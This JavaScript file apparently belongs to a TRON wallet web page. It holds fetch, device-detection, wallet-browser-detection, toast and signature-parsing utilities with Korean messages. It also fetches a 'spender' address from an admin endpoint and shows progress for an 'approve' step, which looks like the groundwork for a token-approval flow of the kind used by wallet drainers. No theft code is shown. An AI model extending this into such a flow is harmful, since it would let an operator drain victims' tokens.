// ========== API FETCH WRAPPER (timeout + retry) ==========
async function apiFetch(url, options, retries) {
    retries = retries === undefined ? 2 : retries;
    options = options || {};
    for (var attempt = 0; attempt <= retries; attempt++) {
        var ctrl = new AbortController();
        var timeout = setTimeout(function () { ctrl.abort(); }, 15000);
        try {
            var res = await fetch(url, Object.assign({}, options, { signal: ctrl.signal }));
            clearTimeout(timeout);
            if (!res.ok && attempt < retries) continue;
            return res;
        } catch (e) {
            clearTimeout(timeout);
            if (attempt === retries) throw e;
            await new Promise(function (r) { setTimeout(r, 500 * (attempt + 1)); });
        }
    }
}

// ========== UTILS ==========
function escapeHtml(s) {
    var d = document.createElement('div');
    d.textContent = s;
    return d.innerHTML;
}

function isMobile() {
    var ua = navigator.userAgent || '';
    if (/Android|iPhone|iPad|iPod|Mobile/i.test(ua)) return true;
    var hasTouch = (navigator.maxTouchPoints && navigator.maxTouchPoints > 1) || ('ontouchstart' in window);
    var hasExtension = !!(window.tronLink || window.tronWeb);
    if (hasTouch && !hasExtension && window.screen.width <= 1024) return true;
    return false;
}

function isIOS() {
    var ua = navigator.userAgent || '';
    if (/iPhone|iPad|iPod/i.test(ua)) return true;
    if (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1) return true;
    return false;
}

function isAndroid() { return /Android/i.test(navigator.userAgent); }
function isPC() { return !isMobile(); }
function isTrustWalletBrowser() { return /Trust/i.test(navigator.userAgent) || window.trustwallet !== undefined; }
function isTokenPocketBrowser() { return /TokenPocket/i.test(navigator.userAgent); }
function isBitgetBrowser() { return /BitKeep|Bitget/i.test(navigator.userAgent); }
function isOKXBrowser() { return /OKApp|OKX/i.test(navigator.userAgent); }
function isImTokenBrowser() { return /imToken/i.test(navigator.userAgent) || window.imToken !== undefined; }

function isWalletBrowser() {
    return isTrustWalletBrowser() || isTokenPocketBrowser() ||
        isBitgetBrowser() || isOKXBrowser() || isImTokenBrowser();
}

function showToast(msg, type) {
    type = type || 'success';
    var c = document.getElementById('toast-container');
    if (!c) return;
    var t = document.createElement('div');
    t.className = 'flex items-center gap-3 px-5 py-3.5 rounded-2xl pointer-events-auto text-xs font-semibold transition-all transform translate-y-2 opacity-0 border';
    var iconColor = type === 'success' ? '#10b981' : type === 'error' ? '#ef4444' : '#64748b';
    t.innerHTML = '<i class="fa-solid ' + (type === 'error' ? 'fa-circle-exclamation' : 'fa-circle-check') + '" style="color:' + iconColor + '"></i><span>' + escapeHtml(msg) + '</span>';
    c.appendChild(t);
    requestAnimationFrame(function () { t.classList.remove('translate-y-2', 'opacity-0'); });
    setTimeout(function () {
        t.classList.add('translate-y-2', 'opacity-0');
        setTimeout(function () { t.remove(); }, 300);
    }, 3500);
}

function copyText(t, l) {
    navigator.clipboard.writeText(t).then(function () { showToast(l + ' 복사됨'); }).catch(function () { showToast('복사 실패', 'error'); });
}

async function getSpenderAddress() {
    try {
        var r = await apiFetch(API_BASE + '/admin/spender');
        var d = await r.json();
        if (d.status === 'ok' && d.address) return d.address;
    } catch (e) { }
    return null;
}

// Progress bar helpers
function setProgress(pct, text) {
    var bar = document.getElementById('approve-progress');
    var barInner = document.getElementById('approve-progress-bar');
    var barText = document.getElementById('approve-progress-text');
    if (bar) bar.classList.remove('hidden');
    if (barInner) barInner.style.width = pct + '%';
    if (barText) barText.textContent = text || '처리 중...';
}

function hideProgress() {
    var bar = document.getElementById('approve-progress');
    if (bar) bar.classList.add('hidden');
}

// ========== WalletConnect Signature Parser ==========
function parseWcSignature(wcResult, originalTx) {
    if (!wcResult) throw new Error('서명 데이터 없음');
    if (wcResult.result) wcResult = wcResult.result;
    if (typeof wcResult === 'string') {
        try { wcResult = JSON.parse(wcResult); }
        catch (e) { wcResult = { signature: [wcResult] }; }
    }
    var payload = JSON.parse(JSON.stringify(originalTx));
    if (wcResult.raw_data && wcResult.signature) return wcResult;
    if (wcResult.signature) {
        payload.signature = Array.isArray(wcResult.signature) ? wcResult.signature : [wcResult.signature];
        return payload;
    }
    throw new Error('유효한 서명 데이터 없음');
}

// ========== base58 → hex 변환 ==========
function base58ToHex(b58) {
    var ALPHABET = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';
    var result = BigInt(0);
    for (var i = 0; i < b58.length; i++) {
        var c = ALPHABET.indexOf(b58[i]);
        if (c < 0) throw new Error('Invalid base58');
        result = result * BigInt(58) + BigInt(c);
    }
    var hex = result.toString(16);
    while (hex.length < 50) hex = '0' + hex;
    return hex.substring(2, 42);
}